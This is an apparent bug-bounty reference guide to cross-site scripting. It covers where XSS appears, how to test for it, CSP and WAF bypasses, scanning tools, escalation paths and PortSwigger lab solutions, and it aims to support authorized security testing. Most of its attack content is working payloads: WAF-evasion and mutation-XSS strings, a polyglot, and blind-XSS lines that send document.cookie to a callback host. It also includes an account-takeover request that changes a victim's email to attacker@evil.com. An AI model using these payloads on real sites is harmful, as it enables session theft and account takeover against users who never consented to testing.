# Cross-Site Scripting (XSS)

> One-line summary: Attacker-controlled JavaScript running in a victim's browser inside the target's origin — the most common web bug and a reliable payer when you prove real impact (token theft, account takeover, privilege escalation) instead of a bare `alert(1)`.

## Overview

XSS occurs when user-controlled input reaches an HTML, attribute, JS, or CSS context without correct context-aware encoding, so the browser parses attacker data as markup or code. Three classes: reflected (payload in the immediate response), stored (payload persisted server-side and served to other users), and DOM-based (source-to-sink flow entirely in client-side JS; payload never appears in the server response). Impact ranges from reading authenticated data and stealing session tokens to full account takeover, wormable propagation, and persistence via service workers. Programs pay for demonstrated impact: `alert()` on a page nobody else sees is usually N/A or low, while stored XSS in a shared view, blind XSS firing in an admin panel, or a payload that performs authenticated actions as the victim is P2–P1.

## Where to find it

- Reflected: search fields (`q`, `s`, `query`), error/404 pages reflecting the path or a message, filter/sort params, `next`/`returnUrl`/`url` params, language/locale selectors, anything reflected into headers or debug panels (Referer, User-Agent, X-Forwarded-For).
- Stored: profile fields (display name, bio, website), comments/reviews, support tickets and replies, chat/DMs, order/invoice metadata, uploaded filenames (also inside ZIP/CSV/SVG), markdown and rich-text renderers, admin log viewers (log injection → stored XSS that fires in the admin panel).
- DOM: any place client-side JS reads `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage` data and passes it to `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, `setTimeout(string)`, jQuery `$()`, `.html()`, `.append()` with HTML, or framework escape hatches (`dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`).
- Framework tell-tales: AngularJS expressions (`{{ }}`), Rails `raw`/`html_safe`, Django `|safe`/`mark_safe`, Twig `|raw`, Handlebars `{{{ }}}`, EJS `<%- %>`, Smarty `{ }` — these are the "intentionally unsafe" markers to grep for in source or fuzz for.
- Contexts worth probing, in order of yield: HTML body → quoted attribute → unquoted attribute → `<script>` string → template literal → `href`/`src` (javascript: URI) → `<title>`/`<textarea>`/`<noscript>` → SVG/MathML → JSON response consumed by JS → CSS/`<style>`.

## Methodology

1. **Map inputs to outputs.** Crawl the app (`katana -u https://target.com -jc -d 4`) and list every param, header, and path segment. Inject a unique canary like `xsszqx123` — never `test` — so you can grep responses unambiguously.
2. **Determine context.** Send `xsszqx123<>"'`;` and inspect the raw response (Burp / View Source), not the rendered DOM. Note exactly which characters survive unencoded and what wraps them (tag body? `value="..."`? `var a='...'`? template literal?).
3. **Pick the minimal payload for that context** (see Payloads). A single-character context matters: `"` closing an attribute needs `"><script>...`, a JS string needs `';alert(1)//`, an href needs `javascript:`.
4. **Confirm execution, not reflection.** Reflection is not a bug until the browser runs it. Load the URL in a real browser (Burp's embedded browser, a disposable profile) or set a breakpoint on the sink. False-positive markers: `&lt;`/`&quot;` encoding, payload inside `<textarea>`/`<title>`/`<noscript>`, `Content-Type: application/json` on the response (not rendered as HTML), `Content-Disposition: attachment`, `X-Content-Type-Options: nosniff` + non-HTML type, Strict CSP with no bypass.
5. **Test stored paths cross-account.** Submit from account A on a shared object (profile, comment, ticket); load as account B, then as an admin/staff view if one exists. Blind XSS payloads go in support tickets, contact/feedback forms, User-Agent, order notes, and referral codes — then watch your callback.
6. **Hunt DOM XSS deliberately.** Grep bundles: `grep -rE "innerHTML|outerHTML|document\.write|insertAdjacentHTML|eval\(|setTimeout\(|location\.(hash|search)|postMessage" *.js`, trace each sink back to a controllable source, then test `#"><img src=x onerror=alert(1)>` and `?q=<svg onload=alert(1)>`. DevTools: breakpoint on the sink, watch the tainted string arrive.
7. **Check CSP before claiming severity.** `curl -sI https://target.com | grep -i content-security-policy`. No CSP or `unsafe-inline` → trivial. `script-src` with a JSONP-enabled allowlisted host → find the JSONP callback. Nonce/hash-strict CSP → the injection is real but usually low; look for dangling markup or an allowlisted gadget instead of submitting immediately.
8. **Prove impact before reporting.** Replace `alert(document.domain)` with something demonstrating real access: `fetch('https://YOUR.oast.pro/?c='+document.cookie)`, read a CSRF token and submit a real request, or change the victim's email. That difference is the difference between N/A and P1.

## Payloads

```html
<!-- Basic HTML-body execution -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>

<!-- Breaking out of a quoted attribute -->
"><img src=x onerror=alert(document.domain)>
'><svg onload=alert(document.domain)>
" autofocus onfocus=alert(document.domain) x="
' onmouseover='alert(document.domain)

<!-- Breaking out of an unquoted attribute -->
autofocus onfocus=alert(document.domain) x=

<!-- Breaking out of a <script> string (single quote / double quote / backtick / template) -->
';alert(document.domain)//
"-alert(document.domain)-"
\';alert(document.domain)//
${alert(document.domain)}
</script><script>alert(document.domain)</script>

<!-- URI contexts (href, src, iframe srcdoc) -->
javascript:alert(document.domain)
javascript:alert(document.domain)//https://target.com
data:text/html,<script>alert(document.domain)</script>

<!-- When <script> tags are filtered: event handlers and other elements -->
<input autofocus onfocus=alert(document.domain)>
<select autofocus onfocus=alert(document.domain)>
<video><source onerror=alert(document.domain)>
<marquee onstart=alert(document.domain)>

<!-- When parentheses, quotes, or the word "alert" are filtered -->
<svg onload=alert`1`>
<img src=x onerror="window['alert'](1)">
<img src=x onerror=top['al'+'ert'](1)>
<img src=x onerror=Function('alert(1)')()>

<!-- DOM XSS delivery -->
https://target.com/page#<img src=x onerror=alert(1)>
https://target.com/page?q=<svg onload=alert(1)>

<!-- Blind XSS: proves execution and exfiltrates the cookie via a real browser hit -->
<script src="https://YOUR-OAST.oast.pro/x"></script>
<script>fetch('https://YOUR-OAST.oast.pro/?c='+encodeURIComponent(document.cookie))</script>
```

```html
<!-- WAF / filter evasion -->
<scr<script>ipt>alert(1)</script>          <!-- nested tag stripped once -->
<img/src=x/onerror=alert(1)>               <!-- slash instead of space -->
<sVg/oNloAd=alert(1)//>                    <!-- case + // terminator -->
<img src=x onerror=alert&#40;1&#41;>       <!-- entity-encoded parens -->
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
<xss id=x tabindex=1 onfocus=alert(1)></xss>
<details open ontoggle=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">   <!-- mXSS via namespace mutation -->

<!-- Polyglot (0xsobky) — try in one shot across unknown contexts -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<!-- AngularJS (expression sinks / CSP bypass via CDN if script-src allows it) -->
{{constructor.constructor('alert(1)')()}}
<div ng-app>{{$eval.constructor('alert(1)')()}}</div>

<!-- Classic CSP JSONP bypass -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

## Bypasses & edge cases

- **Context-specific escapes:** inside `<title>` you must first `</title>`; inside `<textarea>` → `</textarea>`; inside `<style>` → `</style>`; inside `<noscript>` with JS enabled → `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`.
- **`javascript:` blocked by a filter:** try entity/whitespace obfuscation (`jav&#x09;ascript:`, `java\nscript:`), mixed case, or a different sink (`<svg><a xlink:href=...>`).
- **Egress blocked (CSP `connect-src`/corp proxy):** if you cannot call out, write the stolen data to a same-origin sink you can read back later (draft messages, avatar URL, profile field, share link) or act in-session instead of exfiltrating.
- **`postMessage` handlers without origin checks:** any page you control that opens or frames the target can deliver the payload — test from the console with `win.postMessage(payload, '*')` and watch DOM sinks in the receiving app.
- **JSON reflected XSS:** `Content-Type: application/json` is generally not HTML-rendered by modern browsers. Still exploitable via content-type confusion, an app endpoint that re-serves the value as HTML, or client-side `eval` of the JSON (grep for `JSON.parse` on attacker-influenced data — usually a DOM XSS instead).
- **DOM sinks bypassing server-side filters:** server WAFs never see `#fragment`; `window.name` and `postMessage` data are also client-only — test these when the server side is clean.
- **Markdown/rich text:** `[x](javascript:alert(1))` sometimes survives sanitizers; older DOMPurify versions are mXSS-vulnerable; `data-*` attributes round-tripped through a sanitizer can re-mutate.
- **File upload → XSS:** SVG with `<script>` served same-origin, HTML file served with `text/html`, or a filename rendered unescaped in the UI.
- **Self-XSS is not dead:** it pays when chained — e.g., a param only the victim can influence, or self-XSS + CSRF + a login flow that carries the payload (see the writeup in References).
- **CSP quirks:** `script-src 'unsafe-eval'` makes `setTimeout("alert(1)")` work; allowlisted CDNs with JSONP or Angular are the standard bypass; missing `base-uri` enables `<base href>` hijack of relative scripts; missing `object-src` enables `<object data=...>`.
- **Blind XSS timing:** payloads in admin-only views may fire hours/days later — leave the callback running and note the timestamp in the report.

## Tools

- **katana** — crawl and collect URL params and JS files: `katana -u https://target.com -jc -d 4 -silent | grep '=' | sort -u > urls.txt`
- **dalfox** — reflection/context-aware XSS scanner: `dalfox url "https://target.com/search?q=test" --deep-domxss --waf-evasion` / `dalfox file urls.txt --worker 50 --blind https://YOUR-OAST.oast.pro -o xss.txt` / `cat urls.txt | dalfox pipe`
- **nuclei** — DAST XSS templates (requires `-dast`): `nuclei -l urls.txt -dast -t dast/vulnerabilities/xss/ -o xss-nuclei.txt`
- **interactsh-client** — your OAST listener for blind XSS callbacks: `interactsh-client -v -o oast.txt` (use the printed domain in your payloads)
- **XSStrike** — context analysis and payload generation: `python3 xsstrike.py -u "https://target.com/?q=test" --crawl`
- **Burp Suite** — DOM Invader (built into the Burp browser; enable it, set a canary, watch `innerHTML`/`eval`/`postMessage` sinks), Backslash Powered Scanner for filter fuzzing, Repeater for manual context testing.
- **XSS Hunter / xss.report** — hosted blind-XSS listeners with full DOM and cookie capture; use the payload URL they generate (equivalent to the interactsh payload above).
- **grep over downloaded JS** — find DOM sinks fast: `grep -rEho "(innerHTML|outerHTML|document\.write|insertAdjacentHTML|eval|setTimeout|location\.(hash|search|href))" ./js/ | sort | uniq -c | sort -rn`
- **Burp Param Miner** — discovers hidden and unlinked reflected parameters that a crawl will never reach; run it against every endpoint with a body or a query string.

## Escalation & chaining

- **Session/token theft:** if cookies are `HttpOnly`, don't stop — XSS can read CSRF tokens from the DOM or meta tags and replay authenticated state-changing requests itself; no cookie access needed for full ATO.
- **XSS → ATO:** `fetch('/api/email', {method:'POST', credentials:'include', body:'email=attacker@evil.com'})` then trigger a password reset to the attacker's address. This is the standard paid-impact demo.
- **XSS on any subdomain** where the session cookie scope is `.target.com` (or the app accepts cookies across subdomains) → ATO on the main app.
- **Blind XSS in admin panels** → internal-only endpoints, customer PII, and SSRF-style admin fetchers; document the panel URL your payload fired on.
- **XSS + CSRF-token weakness:** XSS trivially defeats CSRF tokens, so any XSS is implicitly a CSRF bypass — mention this in impact.
- **Service worker / persistence:** register a service worker from page JS to keep executing after the tab closes (only report if the impact is real, e.g. on an internal tool).
- **Worm potential:** stored XSS in a social feature (posts visible to all, invite flows) — demonstrate a non-destructive self-propagation proof, not an actual worm.
- **Pre-auth XSS on the login/SSO page** is worth more than post-auth: the victim is not yet logged in, delivery is a single link, and auth subdomains typically sit inside the parent cookie scope — combine with credential-phishing impact only in the report, never in the PoC.

## Report notes

- Raw HTTP request and full response showing the payload and its context; a screenshot of View Source or the DevTools DOM, plus a screenshot/video of actual JS execution.
- Exact payload as submitted (URL-encoded and decoded), and the exact URL. Screenshots must let triage reproduce in one copy-paste.
- Browser + version and OS used for confirmation (execution differs across browsers, especially for mXSS and DOM sinks).
- For stored/blind: attacker account, victim account, timestamp of the callback, and the callback log (interactsh output or XSS Hunter report).
- Impact statement in concrete terms: what the attacker reads or does with the victim's session. State the CSP and cookie flags (`HttpOnly`, `SameSite`) — they change severity.
- One short remediation note (context-aware output encoding; for DOM, use `textContent`/sanitizers) — reviewers appreciate it but it is not the payload.

## Lab walkthroughs (PortSwigger XSS labs)

Worked examples for identifying the exact XSS context. The repeating process: inject a canary → find it in the response/DOM → determine the context → pick the breakout for that context.

### HTML context with tag/attribute filters

**Reflected XSS into HTML context with most tags and attributes blocked**
1. `<script>alert(1)</script>` → "tags are not allowed"
2. Inject `<>` → reflected as "no result for <>", so *some* tags are allowed
3. Brute-force tags with Burp: `?search=<$$>` using PortSwigger's tag list → `<body>` allowed
4. `<body onload='alert(1)'>` → "attributes are not allowed"
5. Brute-force events: `?search=<body%20$$>` using PortSwigger's event list → `onresize` allowed
6. `<body onresize='alert(1)'>` fires when the page resizes — deliver with `print()`:
```html
<iframe src="https://LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

**Reflected XSS with some SVG markup allowed**
1. `<script>alert(3)</script>` → "tags are not allowed"
2. Brute-force tags → `svg` allowed; brute-force events → `onbegin` allowed
3. Payload: `<svg><animateTransform onbegin="alert(1)">`

**Reflected XSS into HTML context with all tags blocked except custom ones**
1. Standard tags and events all blocked — but custom tags still work
2. Payload: `<custom-tag onmouseover=alert(1)>`
3. To deliver to the victim:
```html
<script>location = 'https://LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>
```

**Stored DOM XSS (comment box)**
1. `<h1>hello</h1>` renders, but the second tag gets stripped
2. Nest the tags so stripping leaves one behind: `<h1><img src=1 onerror=alert(1)>`

### DOM sinks (client-side)

**DOM XSS in document.write sink using source location.search**
1. Search `hello`, inspect the source: `document.write('<img src="...tracker.gif?searchTerms='+query+'">')` — input lands inside a JS string inside a write
2. Payload: `"><script>alert(1)</script>`

**DOM XSS in document.write sink inside a select element**
1. Selecting a store renders `<select name="storeId">...` from the URL
2. Inject in the URL: `?productId=1&storeId=London"><script>alert(1)</script>`

**DOM XSS in jQuery anchor href sink using location.search source**
1. Feedback page source: `$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));`
2. Input is the `returnPath` param → `?returnPath=javascript:alert(document.cookie)`

**DOM XSS in jQuery selector sink using a hashchange event**
1. Source: `$(window).on('hashchange', function(){ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); ...`
2. Everything after `#` runs as a jQuery selector: `/#<img src=x onerror='alert(1)'>`
3. Deliver with `print()`:
```html
<iframe src="https://LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

**DOM XSS in AngularJS expression (angle brackets and double quotes HTML-encoded)**
1. The search box renders AngularJS expressions (`{{hello}}` echoes back)
2. Payload: `{{constructor.constructor('alert(1)')()}}`

**Reflected DOM XSS (eval on JSON response)**
1. Response is JSON: `{"results":[],"searchTerm":"hello"}` and the app evals it
2. Payload: `hello/"-alert(1)}//` → response becomes `{"results":[],"searchTerm":"hello\\"-alert(1)}//"}`
   - `/"` escapes the JSON string quote; `//` comments out the code behind

**Main sinks that can lead to DOM XSS:**
```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

**jQuery functions that can lead to XSS:**
```
add()  after()  append()  animate()  insertAfter()  insertBefore()
before()  html()  prepend()  replaceAll()  replaceWith()  wrap()
wrapInner()  wrapAll()  has()  constructor()  init()  index()
jQuery.parseHTML()  $.parseHTML()
```

### Attribute & JavaScript-string contexts

**Stored XSS into anchor href attribute (double quotes HTML-encoded)**
1. The website field becomes `<a id="author" href="fake.com">fake</a>` — full control of `href`
2. Payload in the website field: `javascript:alert(1)`

**Reflected XSS in canonical link tag**
1. Input appears in `<link rel="canonical" href="https://LAB-ID.web-security-academy.net/post?postId=2">`
2. Inject access key + event: `https://LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(2)`
3. Result: `<link rel="canonical" href="https://LAB-ID.../?" accesskey="x" onclick="alert(2)">`
4. Triggers on keyboard shortcut — Linux/Windows `Alt+Shift+X`, macOS `Ctrl+Alt+X`

**Reflected XSS into a JavaScript string (angle brackets and double quotes HTML-encoded, single quotes escaped)**
1. `'` becomes `\'`
2. Payload `\';alert(document.domain)//` — your backslash eats the server's escape backslash: `\\';alert(document.domain)//`

**Stored XSS into onclick event (angle brackets and double quotes HTML-encoded, single quotes and backslash escaped)**
1. Website lands in `onclick="var tracker={track(){}};tracker.track('URL');"` and `'` becomes `\'`
2. HTML-encode the quote so the browser decodes it *after* the server-side escaping: `http://foo?&apos;-alert(1)-&apos;`
3. Result: `<a ... onclick="var tracker={track(){}};tracker.track('http://foo?&apos;-alert(1)-&apos;');">`

**Reflected XSS into a template literal (angle brackets, single/double quotes, backslash and backticks Unicode-escaped)**
1. Input lands inside backticks: `` `0 search results for 'hello'` ``
2. Template literals execute `${...}` expressions: `${alert(1)}`

**Reflected XSS into a JavaScript string (single quote and backslash escaped)**
1. `var searchTerms = 'hello';` — quotes are escaped but the `<script>` block isn't
2. Break out of the script block: `hello'</script><img src=x onerror=alert(document.cookie)>`
   - Also works: `</script><script>alert(2)</script>`

**Reflected XSS into a JavaScript string (angle brackets HTML encoded)**
1. `var searchTerms = ''hello'';` — nothing is escaped
2. Close and reopen the string: `'-alert(1)-'`

## References

- [PortSwigger Web Security Academy — Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP — XSS](https://owasp.org/www-community/attacks/xss/) / [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [HackTricks — XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [PayloadsAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PortSwigger Research — DOM based AngularJS sandbox escapes](https://portswigger.net/research/dom-based-angularjs-sandbox-escapes)
- [HackerOne #3115705 — Dust: Stored XSS in file upload leads to privilege escalation and workspace takeover](https://hackerone.com/reports/3115705)
- [HackerOne #3608199 — Basecamp: DOM XSS in fizzy.do import leading to account takeover](https://hackerone.com/reports/3608199)
- [InfoSec Writeups — Chaining a DOM XSS sink, WAF bypass, cross-origin smuggling, and SDK abuse into one-click ATO](https://infosecwriteups.com/chaining-a-dom-xss-sink-waf-bypass-cross-origin-smuggling-and-sdk-abuse-into-one-click-account-6c1a7095f8e1)
